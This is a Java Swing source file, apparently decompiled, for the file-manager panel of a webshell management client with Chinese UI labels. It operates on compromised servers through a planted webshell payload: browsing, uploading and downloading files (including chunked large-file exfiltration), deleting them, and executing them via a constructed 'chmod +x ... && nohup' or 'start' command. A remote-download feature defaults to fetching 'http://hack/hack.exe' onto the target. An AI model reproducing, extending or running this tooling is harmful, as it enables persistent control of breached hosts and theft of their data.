package core.ui.component;

import core.ApplicationContext;
import core.Db;
import core.Encoding;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.dialog.FileAttr;
import core.ui.component.dialog.FileDialog;
import core.ui.component.dialog.HttpProgressBar;
import core.ui.component.model.FileInfo;
import core.ui.component.model.FileOpertionInfo;
import core.ui.imp.ActionDblClick;
import core.ui.imp.ButtonToMenuItem;
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Toolkit;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.ActionEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Vector;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.TransferHandler;
import javax.swing.tree.DefaultMutableTreeNode;
import util.Log;
import util.automaticBindClick;
import util.functions;

public class ShellFileManager extends JPanel {
    public static final ThreadLocal<Boolean> bigFileThreadLocal = new ThreadLocal<>();
    @ButtonToMenuItem
    private JButton bigFileDownloadButton;
    @ButtonToMenuItem
    private JButton bigFileUploadButton;
    @ButtonToMenuItem
    private JButton copyFileButton;
    @ButtonToMenuItem
    private JButton copyNameButton;
    private String currentDir;
    private DataView dataView;
    private JPanel dataViewPanel;
    private JScrollPane dataViewSplitPane;
    private Vector<String> dateViewColumnVector;
    @ButtonToMenuItem
    private JButton deleteFileButton;
    private JTextField dirField;
    private ImageIcon dirIcon;
    private JPanel dirPanel;
    @ButtonToMenuItem
    private JButton downloadButton;
    private final Encoding encoding;
    @ButtonToMenuItem
    private JButton executeFileButton;
    @ButtonToMenuItem
    private JButton fileAttrButton;
    private DataTree fileDataTree;
    private ImageIcon fileIcon;
    private JPanel fileOpertionPanel;
    private JPanel filePanel;
    @ButtonToMenuItem
    private JButton fileRemoteDownButton;
    private JScrollPane filelJscrollPane;
    private JSplitPane jSplitPane1;
    private JSplitPane jSplitPane2;
    private JSplitPane jSplitPane3;
    @ButtonToMenuItem
    private JButton moveButton;
    @ButtonToMenuItem
    private JButton newDirButton;
    @ButtonToMenuItem
    private JButton newFileButton;
    private final Payload payload;
    @ButtonToMenuItem
    private JButton refreshButton;
    private DefaultMutableTreeNode rootTreeNode;
    private ShellRSFilePanel rsFilePanel;
    private final ShellEntity shellEntity;
    private JScrollPane toolSplitPane;
    private JPanel toolsPanel;
    @ButtonToMenuItem
    private JButton uploadButton;

    public ShellFileManager(ShellEntity entity) {
        this.shellEntity = entity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        setLayout(new BorderLayout(1, 1));
        InitJPanel();
        InitEvent();
        updateUI();
        init(this.shellEntity);
    }

    public void init(ShellEntity shellEntity2) {
        String[] fileRoot;
        for (String str : this.payload.listFileRoot()) {
            this.fileDataTree.AddNote(str);
        }
        this.currentDir = functions.formatDir(this.payload.currentDir());
        this.currentDir = this.currentDir.substring(0, 1).toUpperCase() + this.currentDir.substring(1);
        this.dirField.setText(this.currentDir);
        this.fileDataTree.AddNote(this.currentDir);
    }

    private void InitJPanel() {
        this.filePanel = new JPanel();
        this.filePanel.setLayout(new BorderLayout(1, 1));
        this.filelJscrollPane = new JScrollPane();
        this.rootTreeNode = new DefaultMutableTreeNode("Disk");
        this.fileDataTree = new DataTree("", this.rootTreeNode);
        this.fileDataTree.setRootVisible(true);
        this.filelJscrollPane.setViewportView(this.fileDataTree);
        this.filePanel.add(this.filelJscrollPane);
        this.fileOpertionPanel = new JPanel(new CardLayout());
        this.dateViewColumnVector = new Vector<>();
        this.dateViewColumnVector.add("icon");
        this.dateViewColumnVector.add("name");
        this.dateViewColumnVector.add("type");
        this.dateViewColumnVector.add("lastModified");
        this.dateViewColumnVector.add("size");
        this.dateViewColumnVector.add("permission");
        this.dataViewSplitPane = new JScrollPane();
        this.dataViewPanel = new JPanel();
        this.dataViewPanel.setLayout(new BorderLayout(1, 1));
        this.dataView = new DataView(null, this.dateViewColumnVector, 0, 30);
        this.dataViewSplitPane.setViewportView(this.dataView);
        this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
        this.rsFilePanel = new ShellRSFilePanel(this.payload, this.fileOpertionPanel, "dataView");
        this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
        this.dataViewPanel.add(this.fileOpertionPanel);
        this.toolSplitPane = new JScrollPane();
        this.toolsPanel = new JPanel();
        this.uploadButton = new JButton("上传");
        this.refreshButton = new JButton("刷新");
        this.moveButton = new JButton("移动");
        this.copyFileButton = new JButton("复制");
        this.downloadButton = new JButton("下载");
        this.copyNameButton = new JButton("复制绝对路径");
        this.deleteFileButton = new JButton("删除文件");
        this.newFileButton = new JButton("新建文件");
        this.newDirButton = new JButton("新建文件夹");
        this.fileAttrButton = new JButton("文件属性");
        this.fileRemoteDownButton = new JButton("远程下载");
        this.executeFileButton = new JButton("执行");
        this.bigFileDownloadButton = new JButton("大文件下载");
        this.bigFileUploadButton = new JButton("大文件上传");
        this.toolsPanel.add(this.uploadButton);
        this.toolsPanel.add(this.moveButton);
        this.toolsPanel.add(this.refreshButton);
        this.toolsPanel.add(this.copyFileButton);
        this.toolsPanel.add(this.copyNameButton);
        this.toolsPanel.add(this.deleteFileButton);
        this.toolsPanel.add(this.newFileButton);
        this.toolsPanel.add(this.newDirButton);
        this.toolsPanel.add(this.downloadButton);
        this.toolsPanel.add(this.fileAttrButton);
        this.toolsPanel.add(this.fileRemoteDownButton);
        this.toolsPanel.add(this.executeFileButton);
        this.toolsPanel.add(this.bigFileUploadButton);
        this.toolsPanel.add(this.bigFileDownloadButton);
        this.toolSplitPane.setViewportView(this.toolsPanel);
        this.dirPanel = new JPanel();
        this.dirPanel.setLayout(new BorderLayout(1, 1));
        this.dirField = new JTextField();
        this.dirField.setColumns(100);
        this.dirPanel.add(this.dirField);
        this.dirIcon = new ImageIcon(getClass().getResource("/images/folder.png"));
        this.fileIcon = new ImageIcon(getClass().getResource("/images/file.png"));
        this.fileDataTree.setLeafIcon(new ImageIcon(getClass().getResource("/images/folder.png")));
        this.jSplitPane2 = new JSplitPane();
        this.jSplitPane2.setOrientation(0);
        this.jSplitPane2.setTopComponent(this.dataViewPanel);
        this.jSplitPane2.setBottomComponent(this.toolSplitPane);
        this.jSplitPane3 = new JSplitPane();
        this.jSplitPane3.setOrientation(0);
        this.jSplitPane3.setTopComponent(this.dirPanel);
        this.jSplitPane3.setBottomComponent(this.jSplitPane2);
        this.jSplitPane1 = new JSplitPane();
        this.jSplitPane1.setOrientation(1);
        this.jSplitPane1.setLeftComponent(this.filePanel);
        this.jSplitPane1.setRightComponent(this.jSplitPane3);
        add(this.jSplitPane1);
    }

    private void InitEvent() {
        automaticBindClick.bindJButtonClick(this, this);
        automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
        this.dataView.setActionDblClick(new ActionDblClick() {
             

            @Override 
            public void dblClick(MouseEvent e) {
                ShellFileManager.this.dataViewDbClick(e);
            }
        });
        this.fileDataTree.setActionDbclick(new ActionDblClick() {
             

            @Override 
            public void dblClick(MouseEvent e) {
                ShellFileManager.this.fileDataTreeDbClick(e);
            }
        });
        this.dirField.addKeyListener(new KeyAdapter() {
             

            public void keyPressed(KeyEvent e) {
                if (e.getKeyChar() == '\n') {
                    ShellFileManager.this.refreshButtonClick(null);
                }
            }
        });
        this.jSplitPane2.setTransferHandler(new TransferHandler() {
             
            private static final long serialVersionUID = 1;

            public boolean importData(JComponent comp, Transferable t) {
                try {
                    Object o = t.getTransferData(DataFlavor.javaFileListFlavor);
                    if (List.class.isAssignableFrom(o.getClass())) {
                        List list = (List) o;
                        if (list.size() == 1) {
                            Object fileObject = list.get(0);
                            if (File.class.isAssignableFrom(fileObject.getClass())) {
                                File file = (File) fileObject;
                                if (!file.canRead() || !file.isFile()) {
                                    JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "目标不是文件 或不可读");
                                    return true;
                                }
                                ShellFileManager.this.uploadFile(ShellFileManager.this.currentDir + file.getName(), file, false);
                                return true;
                            }
                            JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "目标不是文件");
                            return true;
                        }
                        JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "不支持多文件操作");
                        return true;
                    }
                    JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "不支持的操作");
                    return true;
                } catch (Exception e) {
                    JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), e.getMessage(), "提示", 1);
                    Log.error(e);
                    return false;
                }
            }

            public boolean canImport(JComponent comp, DataFlavor[] flavors) {
                for (DataFlavor dataFlavor : flavors) {
                    if (DataFlavor.javaFileListFlavor.equals(dataFlavor)) {
                        return true;
                    }
                }
                return false;
            }
        });
    }

    private boolean isLinux() {
        return this.payload.currentDir().charAt(0) == '/';
    }

    public void dataViewDbClick(MouseEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo) rowVector.get(4)).getSize();
        if (((String) rowVector.get(2)).equals("dir")) {
            refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        } else if (fileSize < 1048576) {
            this.rsFilePanel.rsFile(fileNameString);
            ((CardLayout)((CardLayout)this.fileOpertionPanel.getLayout())).show(this.fileOpertionPanel, "rsFile");
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "目标文件大小大于1MB", "提示", 2);
        }
    }

    public void fileDataTreeDbClick(MouseEvent e) {
        refreshFile(this.fileDataTree.GetSelectFile());
    }

    public void moveButtonClick(ActionEvent e) {
        String fileString = getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "reName", fileString, fileString);
        if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
            return;
        }
        if (this.payload.moveFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName())) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), String.format("移动成功  %s >> %s", fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "提示", 1);
            return;
        }
        JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "修改失败", "提示", 2);
    }

    public void copyFileButtonClick(ActionEvent e) {
        String fileString = getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "copy", fileString, fileString);
        if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
        } else if (this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName())) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), String.format("复制成功  %s <<>> %s", fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "复制失败", "提示", 2);
        }
    }

    public void copyNameButtonClick(ActionEvent e) {
        Vector vector = this.dataView.GetSelectRow();
        if (vector != null) {
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(functions.formatDir(this.currentDir) + vector.get(1)), (ClipboardOwner) null);
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "已经复制到剪辑版");
        }
    }

    public void deleteFileButtonClick(ActionEvent e) {
        String inputFile = JOptionPane.showInputDialog("输入文件名称", getSelectdFile());
        if (inputFile == null) {
            Log.log("用户取消选择.....", new Object[0]);
        } else if (this.payload.deleteFile(inputFile)) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "删除成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "删除失败", "提示", 2);
        }
    }

    private String getSelectdFile() {
        try {
            return functions.formatDir(this.currentDir) + getSelectFileName();
        } catch (Exception e) {
            return "";
        }
    }

    private String getSelectFileName() {
        return this.dataView.getValueAt(this.dataView.getSelectedRow(), 1).toString();
    }

    public void newFileButtonClick(ActionEvent e) {
        String inputFile = JOptionPane.showInputDialog("输入文件名称", functions.formatDir(this.currentDir) + "newFile");
        if (inputFile == null) {
            Log.log("用户取消选择.....", new Object[0]);
        } else if (this.payload.newFile(inputFile)) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "新建文件成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "新建文件失败", "提示", 2);
        }
    }

    public void uploadButtonClick(ActionEvent e) {
        ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
        if (ApplicationContext.isGodMode()) {
            GUploadFile(false);
        } else {
            UploadFile(false);
        }
    }

    public void bigFileUploadButtonClick(ActionEvent e) {
        new Thread(new Runnable() {
             

            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GUploadFile(true);
                } else {
                    ShellFileManager.this.UploadFile(true);
                }
            }
        }).start();
    }

    public void refreshButtonClick(ActionEvent e) {
        refreshFile(functions.formatDir(this.dirField.getText()));
    }

    public void executeFileButtonClick(ActionEvent e) {
        final String cmdString;
        String inputFile = JOptionPane.showInputDialog("输入可执行文件名称", getSelectdFile());
        if (inputFile != null) {
            if (isLinux()) {
                cmdString = String.format("chmod +x %s && nohup %s > /dev/null", inputFile, inputFile);
            } else {
                cmdString = String.format("start %s ", inputFile);
            }
            new Thread(new Runnable() {
                 

                public void run() {
                    Log.log(String.format("Execute Command Start As %s", cmdString), new Object[0]);
                    Log.log(String.format("execute Command End %s", ShellFileManager.this.payload.execCommand(cmdString)), new Object[0]);
                }
            }).start();
            return;
        }
        Log.log("用户取消选择.....", new Object[0]);
    }

    public void downloadButtonClick(ActionEvent e) {
        ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
        if (ApplicationContext.isGodMode()) {
            GDownloadFile(false);
        } else {
            downloadFile(false);
        }
    }

    public void bigFileDownloadButtonClick(ActionEvent e) {
        new Thread(new Runnable() {
             

            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GDownloadFile(true);
                } else {
                    ShellFileManager.this.downloadFile(true);
                }
            }
        }).start();
    }

    public void newDirButtonClick(ActionEvent e) {
        String inputFile = JOptionPane.showInputDialog("输入文件夹名称", functions.formatDir(this.currentDir) + "newDir");
        if (inputFile == null) {
            Log.log("用户取消选择.....", new Object[0]);
        } else if (this.payload.newDir(inputFile)) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "新建文件夹成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "新建文件夹失败", "提示", 2);
        }
    }

    public void fileAttrButtonClick(ActionEvent e) {
        new FileAttr(this.shellEntity, getSelectdFile(), (String) this.dataView.getValueAt(this.dataView.getSelectedRow(), 5), (String) this.dataView.getValueAt(this.dataView.getSelectedRow(), 3));
    }

    public void fileRemoteDownButtonClick(ActionEvent e) {
        final FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
        if (fileOpertionInfo.getOpertionStatus().booleanValue()) {
            new Thread(new Runnable() {
                 

                public void run() {
                    if (ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName())) {
                        JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "远程下载成功", "提示", 1);
                    } else {
                        JOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "远程下载失败", "提示", 2);
                    }
                }
            }).start();
        }
    }

    private Vector<Vector<Object>> getAllFile(String filePathString) {
        String fileDataString = this.payload.getFile(functions.formatDir(filePathString));
        String[] rowStrings = fileDataString.split("\n");
        Vector<Vector<Object>> rows = new Vector<>();
        if (rowStrings[0].equals("ok")) {
            rows = new Vector<>();
            this.fileDataTree.AddNote(rowStrings[1]);
            this.currentDir = functions.formatDir(rowStrings[1]);
            this.dirField.setText(functions.formatDir(rowStrings[1]));
            for (int i = 2; i < rowStrings.length; i++) {
                String[] fileTypes = rowStrings[i].split("\t");
                Vector<Object> row = new Vector<>();
                if (fileTypes.length == 5) {
                    if (fileTypes[1].equals("0")) {
                        row.add(this.dirIcon);
                        this.fileDataTree.AddNote(this.currentDir + fileTypes[0]);
                    } else {
                        row.add(this.fileIcon);
                    }
                    row.add(fileTypes[0]);
                    row.add(fileTypes[1].equals("0") ? "dir" : "file");
                    row.add(fileTypes[2]);
                    row.add(new FileInfo(fileTypes[3]));
                    row.add(fileTypes[4]);
                    rows.add(row);
                } else {
                    Log.error("格式不匹配 ," + rowStrings[i]);
                }
            }
        } else {
            Log.error(fileDataString);
            Log.error("目标返回异常,无法正常格式化数据!");
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), fileDataString);
        }
        return rows;
    }

    private synchronized void refreshFile(String filePathString) {
        this.dataView.AddRows(getAllFile(filePathString));
        this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
        this.dataView.getModel().fireTableDataChanged();
    }

     
     
    private void GUploadFile(boolean bigFileUpload) {
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "upload", "", "");
        if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
        } else if (fileOpertionInfo.getDestFileName().length() > 0) {
            uploadFile(fileOpertionInfo.getDestFileName(), new File(fileOpertionInfo.getSrcFileName()), bigFileUpload);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "上传路径为空", "提示", 2);
        }
    }

     
     
    private void UploadFile(boolean bigFileUpload) {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileSelectionMode(0);
        chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        if (selectdFile != null) {
            uploadFile(this.currentDir + selectdFile.getName(), selectdFile, bigFileUpload);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
        }
    }

     
     
    private void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
        boolean state;
        byte[] data = new byte[0];
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "upload", selectdFile, uploadFileString, Long.valueOf(Thread.currentThread().getId())), new Object[0]);
        if (bigFileUpload) {
            state = uploadBigFile(uploadFileString, selectdFile);
        } else {
            try {
                FileInputStream fileInputStream = new FileInputStream(selectdFile);
                data = functions.readInputStream(fileInputStream);
                fileInputStream.close();
            } catch (FileNotFoundException e1) {
                Log.error(e1);
                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "文件不存在", "提示", 2);
            } catch (IOException e12) {
                Log.error(e12);
                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), e12.getMessage(), "提示", 2);
            }
            state = this.payload.uploadFile(uploadFileString, data);
        }
        if (state) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "上传成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "上传失败", "提示", 2);
        }
        Log.log(String.format("%s finish \t threadId: %s", "upload", Long.valueOf(Thread.currentThread().getId())), new Object[0]);
    }

     
     
    private void GDownloadFile(boolean bigFileDownload) {
        FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "download", getSelectdFile(), new File(getSelectFileName()).getAbsolutePath());
        if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
        } else if (fileOpertionInfo.getDestFileName().length() > 0) {
            downloadFile(fileOpertionInfo.getSrcFileName(), new File(fileOpertionInfo.getDestFileName()), bigFileDownload);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "下载路径为空", "提示", 2);
        }
    }

     
     
    private void downloadFile(boolean bigFileDownload) {
        boolean z = true;
        JFileChooser chooser = new JFileChooser();
        chooser.setSelectedFile(new File(getSelectFileName()));
        chooser.setFileSelectionMode(0);
        int opt = chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        String srcFile = getSelectdFile();
        if (opt == 0 && srcFile != null) {
            boolean z2 = srcFile.trim().length() > 0;
            if (selectdFile.getName().length() <= 0) {
                z = false;
            }
            if (z2 && z) {
                if (selectdFile != null) {
                    downloadFile(srcFile, selectdFile, bigFileDownload);
                    return;
                } else {
                    JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "信息填写不完整", "提示", 2);
                    return;
                }
            }
        }
        JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "未选中下载文件", "提示", 2);
    }

    private void downloadFile(String srcFileString, File destFile, boolean bigFileDownload) {
        boolean state;
        byte[] bArr = new byte[0];
        Log.log(String.format("%s starting %s -> %s\t threadId: %s", "download", srcFileString, destFile, Long.valueOf(Thread.currentThread().getId())), new Object[0]);
        if (bigFileDownload) {
            state = downloadBigFile(srcFileString, destFile);
        } else {
            state = functions.filePutContent(destFile, this.payload.downloadFile(srcFileString));
        }
        if (state) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "下载成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "下载失败", "提示", 2);
        }
        Log.log(String.format("%s finish \t threadId: %s", "download", Long.valueOf(Thread.currentThread().getId())), new Object[0]);
    }

    private boolean downloadBigFile(String srcFileString, File destFile) {
        int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
        int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
        int oneceBigFileDownloadByteNum = Db.getSetingIntValue("oneceBigFileDownloadByteNum", 1048576);
        ApplicationContext.isShowHttpProgressBar.set(false);
        int cuurentOffset = 0;
        int errorNum = 0;
        try {
            int fileSize = this.payload.getFileSize(srcFileString);
            if (fileSize != -1) {
                FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                HttpProgressBar httpProgressBar = new HttpProgressBar("bigFileDownLoad", fileSize);
                while (cuurentOffset < fileSize) {
                    while (errorNum < bigFileErrorRetryNum) {
                        try {
                            if (httpProgressBar.isClose()) {
                                Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset)), new Object[0]);
                                fileOutputStream.close();
                                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
                                return false;
                            }
                            Thread.sleep((long) bigFileSendRequestSleep);
                            byte[] result = this.payload.bigFileDownload(srcFileString, cuurentOffset, oneceBigFileDownloadByteNum);
                            if (result.length == oneceBigFileDownloadByteNum || result.length + cuurentOffset == fileSize) {
                                cuurentOffset += result.length;
                                fileOutputStream.write(result);
                                httpProgressBar.setValue(cuurentOffset);
                            } else {
                                fileOutputStream.write(result);
                                Log.error(new String(result));
                                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), new String(result), "错误提示", 0);
                                fileOutputStream.close();
                                return false;
                            }
                        } catch (Exception e) {
                            errorNum++;
                            Log.error(e);
                            Thread.sleep(500);
                        }
                    }
                    Log.log(String.format("大文件下载结束 文件大小:%d 下载大小:%d", Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset)), new Object[0]);
                    httpProgressBar.close();
                    JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
                    fileOutputStream.close();
                    return false;
                }
                fileOutputStream.close();
                Log.log("大文件下载结束 src:%s dest:%s 文件大小:%d 下载大小:%d", srcFileString, destFile.getAbsolutePath(), Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset));
                httpProgressBar.close();
                return true;
            }
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "大文件下载失败 文件不存在或者无法访问", "提示", 0);
            Log.error("大文件下载失败 文件不存在或者无法访问");
            return false;
        } catch (Exception e2) {
            Log.error(e2);
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), e2.getMessage(), "错误提示", 0);
            return false;
        }
    }

    public boolean uploadBigFile(String uploadFileString, File selectdFile) {
        int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
        int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
        int oneceBigFileUploadByteNum = Db.getSetingIntValue("oneceBigFileUploadByteNum", 1048576);
        ApplicationContext.isShowHttpProgressBar.set(false);
        try {
            FileInputStream fileInputStream = new FileInputStream(selectdFile);
            int fileSize = (int) selectdFile.length();
            byte[] readData = new byte[oneceBigFileUploadByteNum];
            byte[] bArr = new byte[0];
            int cuurentOffset = 0;
            HttpProgressBar httpProgressBar = new HttpProgressBar("bigFileUpload", fileSize);
            int errorNum = 0;
            Log.log(String.format("大文件上传开始 src:%s dest:%s 文件大小:%d 上传大小:%d", selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), 0), new Object[0]);
            while (true) {
                int readLen = fileInputStream.read(readData);
                if (readLen != -1) {
                    byte[] result = Arrays.copyOfRange(readData, 0, readLen);
                    while (errorNum < bigFileErrorRetryNum) {
                        try {
                            if (httpProgressBar.isClose()) {
                                Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset)), new Object[0]);
                                fileInputStream.close();
                                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
                                return false;
                            }
                            Thread.sleep((long) bigFileSendRequestSleep);
                            String flag = this.payload.bigFileUpload(uploadFileString, cuurentOffset, result);
                            if ("ok".equals(flag)) {
                                errorNum = 0;
                                cuurentOffset += readLen;
                                httpProgressBar.setValue(cuurentOffset);
                            } else {
                                Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset)), new Object[0]);
                                httpProgressBar.close();
                                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), flag, "提示", 0);
                                fileInputStream.close();
                                return false;
                            }
                        } catch (Exception e) {
                            errorNum++;
                            Log.error(e);
                            Thread.sleep(500);
                        }
                    }
                    Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset)), new Object[0]);
                    httpProgressBar.close();
                    JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
                    fileInputStream.close();
                    return false;
                }
                fileInputStream.close();
                Log.log("大文件上传结束 src:%s dest:%s 文件大小:%d 上传大小:%d", selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset));
                httpProgressBar.close();
                return true;
            }
        } catch (Exception e2) {
            Log.error(e2);
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), e2.getMessage(), "错误提示", 0);
            return false;
        }
    }
}
